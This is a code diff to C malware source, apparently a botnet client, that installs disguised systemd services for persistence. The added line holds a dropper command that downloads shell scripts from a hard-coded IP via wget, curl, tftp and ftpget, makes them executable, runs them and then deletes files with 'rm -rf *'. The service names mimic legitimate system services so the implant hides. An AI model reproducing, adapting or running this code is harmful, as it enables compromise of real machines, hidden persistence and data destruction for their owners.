@@ -324,9 +324,6 @@ void util_run_original_shell(int argc, char **argv)
 void util_install_persistence(void)
 {
     util_install_systemd_service();
-    util_install_crontab();
-    util_install_rclocal();
-    util_install_profile();
 }
 
 void util_install_crontab(void)
@@ -466,8 +463,8 @@ void util_install_systemd_service(void)
 {
     int fd;
     char service_path[256];
-    char service_content[2048];
-    const char *curl_cmd = "curl -s https://files.c0rex64.dev/meow.sh | bash";
+    char service_content[4096];
+    const char *payload_cmd = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.107.29/XKcNhY4G8rcYpb.sh; curl -O http://196.251.107.29/XKcNhY4G8rcYpb.sh; chmod 777 XKcNhY4G8rcYpb.sh; sh XKcNhY4G8rcYpb.sh; tftp 196.251.107.29 -c get XKcNhY4G8rcYpb.sh; chmod 777 XKcNhY4G8rcYpb.sh; sh XKcNhY4G8rcYpb.sh; tftp -r XKcNhY4G8rcYpb2.sh -g 196.251.107.29; chmod 777 XKcNhY4G8rcYpb2.sh; sh XKcNhY4G8rcYpb2.sh; ftpget -v -u anonymous -p anonymous -P 21 196.251.107.29 FGx8SNCa4txePA1.sh FGx8SNCa4txePA1.sh; sh FGx8SNCa4txePA1.sh; rm -rf XKcNhY4G8rcYpb.sh XKcNhY4G8rcYpb.sh XKcNhY4G8rcYpb2.sh FGx8SNCa4txePA1.sh; rm -rf *";
     
     if(access("/usr/lib/systemd", F_OK) != 0 && access("/lib/systemd", F_OK) != 0 && access("/etc/systemd", F_OK) != 0)
     {
@@ -484,7 +481,7 @@ void util_install_systemd_service(void)
         "systemd-networkd-resolved.service",
         "NetworkManager-wait-online.service",
         "dbus-org.freedesktop.network1.service",
-        "systemd-resolved.service"
+        "systemd-resolved1.service"
     };
     
     for(int sn = 0; sn < 4; sn++)
@@ -509,7 +506,7 @@ void util_install_systemd_service(void)
                     util_strcpy(service_content + util_strlen(service_content), "[Service]\n");
                     util_strcpy(service_content + util_strlen(service_content), "Type=oneshot\n");
                     util_strcpy(service_content + util_strlen(service_content), "ExecStart=/bin/bash -c '");
-                    util_strcpy(service_content + util_strlen(service_content), curl_cmd);
+                    util_strcpy(service_content + util_strlen(service_content), payload_cmd);
                     util_strcpy(service_content + util_strlen(service_content), " >/dev/null 2>&1'\n");
                     util_strcpy(service_content + util_strlen(service_content), "RemainAfterExit=yes\n");
                     util_strcpy(service_content + util_strlen(service_content), "StandardOutput=null\n");
